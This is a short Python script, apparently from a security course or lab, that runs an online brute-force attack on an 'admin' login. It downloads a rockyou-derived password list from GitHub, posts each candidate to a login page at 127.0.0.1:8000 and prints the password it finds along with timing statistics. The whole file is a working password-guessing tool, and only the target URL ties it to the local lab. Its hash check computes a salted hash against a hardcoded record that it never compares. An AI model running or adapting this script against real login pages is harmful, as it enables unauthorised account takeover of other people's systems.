import hashlib
import time
import requests
from urllib.request import urlopen
from hashlib import sha256

def posttowebsite(url, payload):
    r = requests.post(url, data=payload)
    return r.text

def readwordlist(url): #get an online wordlist
    try:
        wordlistfile = urlopen(url).read()
    except Exception as e:
        print("Hey there was some error while reading the wordlist, error:", e)
        exit()
    return wordlistfile

def hash_pword(salt, pword): #methods from program that hash password
    assert(salt is not None and pword is not None)
    hasher = sha256()
    hasher.update(salt)
    hasher.update(pword.encode('utf-8'))
    return hasher.hexdigest()

def parse_salt_and_password(word):
    return word.split('$')

def check_password(username, salt, word, url): 
    verify = hash_pword(salt.encode('utf-8'), word)
    payload = {
        'uname': username,
        'pword': word
    }
    print('word is: ', word, 'hash is: ', verify)
    if 'Login Failed' in posttowebsite(url, payload):
        return False #did not find
    return True 

def bruteforce(wordlist, username, url): #actually bruteforce
    counter = 0
    salt, password_record = parse_salt_and_password('000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3')
    for word in wordlist:
        counter += 1
        if check_password(username, salt, word, url):
            print("Password is: ", word)
            end = time.time()
            totaltime = end - start
            print('Time it took (in seconds): ', totaltime, ' Total guesses: ', counter, ' Guesses per second: ', (counter/totaltime))
            exit()

    
############# append the below code ################ 
print("hello")

#Set up the wordlist
#wordlisturl = 'https://raw.githubusercontent.com/josuamarcelc/common-password-list/main/rockyou.txt/rockyou_1.txt'
wordlisturl = 'https://raw.githubusercontent.com/lilycui97/TempStorage/main/rockyousmall.txt'
wordlist = readwordlist(wordlisturl).decode('UTF-8')
guesspasswordlist = wordlist.split('\n')
print("finished wordlist")

#Set up the account/url
username = 'admin'
url = 'http://127.0.0.1:8000/login.html'

#Start timer
start = time.time()

print("starting attack")
# Running the Brute Force attack
bruteforce(guesspasswordlist, username, url)

#End timer
end = time.time()

# This would be executed if your password was not there in the wordlist
print("Could not guess the password")
